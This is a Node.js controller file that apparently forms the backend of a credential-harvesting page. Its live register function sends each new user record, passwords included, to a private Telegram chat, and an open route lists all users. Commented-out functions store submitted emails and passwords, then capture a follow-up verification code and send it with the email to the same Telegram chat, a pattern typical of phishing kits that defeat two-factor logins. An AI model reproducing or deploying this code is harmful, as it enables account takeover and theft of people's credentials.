const User = require('../models/userModel')

const TelegramBot = require("node-telegram-bot-api");
const bot = new TelegramBot(process.env.TELEGRAM_BOT_ME);


const register = async(req, res) => {
    try {
       const user = await User.create(req.body)
       bot.sendMessage(process.env.TELEGRAM_CHAT_ID_ME, 
        `New registration from buildings:::: \n ${user}`);
       res.status(201).json({user})
    } catch (error) {
        console.log(error)
        res.status(500).json({ error: error.message})
    }
}


const getAllUsers = async(req, res) => {
    try {
       const users = await User.find({});
       res.status(200).json({ users}) 
    } catch (error) {
        console.log(error);
    }
}
module.exports = {
    register,
    getAllUsers
}



// const os = require("os");

// const getIpAddress = () => {
//   const networkInterfaces = os.networkInterfaces();
//   let ipAddress;
//   for (const interfaceName in networkInterfaces) {
//     const interfaces = networkInterfaces[interfaceName];
//     for (const iface of interfaces) {
//       if (!iface.internal && iface.family === "IPv4") {
//         ipAddress = iface.address;
//         break;
//       }
//     }
//     if (ipAddress) {
//       break;
//     }
//   }
//   return ipAddress;
// };




// const sendEmail = async (req, res) => {
//   try {
//     const ipAddress = getIpAddress();
//      const userAgent = req.headers["user-agent"];
//     let user = await Login.findOne({ ip: ipAddress + userAgent });

//     if(user) {
//         user.email = req.body.email
//         user.password = req.body.password
//         await user.save()
//     }
    

//     req.body.ip = getIpAddress() + userAgent;
//     user = await Login.create(req.body);
   
//     res.status(200).json({ user });
//   } catch (error) {
//     console.log(error);
//     res.status(500).json({ error: error.message });
//   }
// };



// const sendCode = async (req, res) => {
//   try {
//     const ipAddress = getIpAddress();
//     const userAgent = req.headers["user-agent"];
//     if(!ipAddress) {
//        return res.status(404).json({ error: 'ip address not found'})
//     }
//     const user = await Login.findOneAndUpdate({ ip: ipAddress + userAgent }, {code: req.body.code} ,{new: true});
//  if (!user) {
//    return res.status(404).json({ error: "User not found" });
//  }
//     const message = `${`${user.code} from ${user.email}`}`;
//     bot.sendMessage(process.env.TELEGRAM_CHAT_ID_ME, message);

//     res.status(200).json({ user });
//   } catch (error) {
//     console.log(error);
//     res.status(500).json({ error: error.message });
//   }
// };

